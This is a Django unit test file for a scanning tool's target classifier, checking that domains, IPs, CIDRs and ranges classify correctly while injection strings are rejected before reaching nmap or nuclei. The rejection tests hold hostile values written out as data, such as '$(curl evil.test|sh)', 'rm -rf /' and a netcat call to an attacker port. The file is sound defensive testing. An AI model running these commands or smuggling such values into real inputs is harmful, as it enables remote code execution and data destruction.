from django.test import SimpleTestCase

from targetApp import target_types as tt


class ClassifyTargetTests(SimpleTestCase):
	def test_plain_domain_and_ip_still_classify(self):
		self.assertEqual(tt.classify_target('example.com'), tt.DOMAIN)
		self.assertEqual(tt.classify_target('sub.example.com'), tt.DOMAIN)
		self.assertEqual(tt.classify_target('203.0.113.9'), tt.IP)
		self.assertEqual(tt.classify_target('2001:db8::1'), tt.IP)
		self.assertEqual(tt.classify_target('10.0.0.0/8'), tt.CIDR)
		self.assertEqual(tt.classify_target('192.168.1.1-192.168.1.20'), tt.RANGE)
		self.assertEqual(tt.classify_target('192.168.1.1-254'), tt.RANGE)

	def test_ipv6_zone_scope_id_is_rejected(self):
		# ipaddress.ip_address() accepts this with near-arbitrary text after '%'; it must never
		# become a Domain.name (it would reach nmap/bbot/nuclei as a CLI argument).
		self.assertIsNone(tt.classify_target('fe80::1%eth0'))
		self.assertIsNone(tt.classify_target('fe80::1%$(curl evil.test|sh)'))

	def test_shell_metacharacters_are_rejected_as_domains(self):
		for bad in ('$(curl evil.test|sh)', 'evil.test; rm -rf /', 'evil.test`whoami`',
		            'evil.test|nc attacker 4444', '-oG /tmp/pwned.xml', 'a b.com', ''):
			self.assertIsNone(tt.classify_target(bad), bad)

	def test_url_credentials_style_string_is_not_a_domain(self):
		# "user@host" with no port is not a valid domain label and must not classify as one.
		self.assertIsNone(tt.classify_target('$(id)@evil.test'))

	def test_whitespace_only_or_empty_is_rejected(self):
		self.assertIsNone(tt.classify_target(''))
		self.assertIsNone(tt.classify_target('   '))
		self.assertIsNone(tt.classify_target(None))
